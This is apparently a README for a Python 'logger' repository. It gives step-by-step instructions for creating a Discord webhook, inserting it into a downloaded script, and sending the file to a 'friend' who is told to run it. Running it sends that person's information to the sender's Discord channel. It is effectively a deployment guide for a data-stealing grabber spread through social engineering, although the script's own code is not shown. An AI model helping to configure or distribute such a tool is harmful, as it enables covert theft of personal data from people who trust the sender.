# 🕵️ Python Loggers Setup Guide

This guide explains how to set up the Python logger quickly and correctly

Follow each step carefully - it takes less than 2 minutes

---

## 📥 Step 1 -- Download the File

1. Open this repository
2. Click the file you want to use
3. Press **Download** or **Raw → Save As**
4. Save the file somewhere easy to find (Desktop is fine)

---

## 🔗 Step 2 -- Create a Discord Webhook

This webhook is where the data will be sent

### 1. Open Discord Server Settings

1. Open Discord
2. Go to your **server**
3. Click the server name (top-left)
4. Select **Server Settings**

### 2. Go to Integrations

1. In the left sidebar, click **Integrations**
2. Click **Webhooks**

### 3. Create the Webhook

1. Click **New Webhook**
2. Set:

   - **Name:** `Logger`
   - **Channel:** Any private channel or leave untouched

3. Click **Copy Webhook URL**
4. Save it somewhere temporarily (Notepad)

Example format:

https://discord.com/api/webhooks/123456789012345678/ABCDEF...


⚠️ **Do NOT share this link with anyone. Anyone with it can send messages to your server**

---

## 🧩 Step 3 -- Insert the Webhook Into the File

1. Open the downloaded file in:

   - Notepad
   - IDLE
   - Any code editor

2. Press:

`CTRL + F`

3. Search for:

`"YOUR WEBHOOK HERE"`

4. Replace it with your webhook URL

### Example

**Before:**
`WEBHOOK_URL = "YOUR WEBHOOK HERE"`

**After**:
`WEBHOOK_URL = "https://discord.com/api/webhooks/123456789012345678/ABCDEF..."`

Press Save.

---

## 🚀 Step 4 -- Send It to a Friend
Send the edited file to your friend

Ask them to run it normally

When they open it:

Their info is sent to your Discord channel instantly

Check your Discord channel - **the data should appear**

✅ Troubleshooting

| Problem        | Fix                               |
|----------------|-----------------------------------|
| Nothing sends  | Check that webhook is correct     |
| Error on run   | File was edited incorrectly       |
| No messages    | Webhook was deleted               |

---

## 🔒 Important Notes!
Keep your webhook private

Use a private Discord channel

Do not test on yourself unless you want your own data logged
